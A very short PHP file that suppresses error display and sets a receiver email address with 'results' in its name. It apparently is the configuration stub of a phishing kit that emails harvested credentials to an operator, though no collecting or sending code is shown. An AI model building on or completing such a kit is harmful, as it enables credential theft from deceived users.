<?php
ini_set('display_errors', 0);
$receiverAddress = "myresults2017@yandex.com";


?>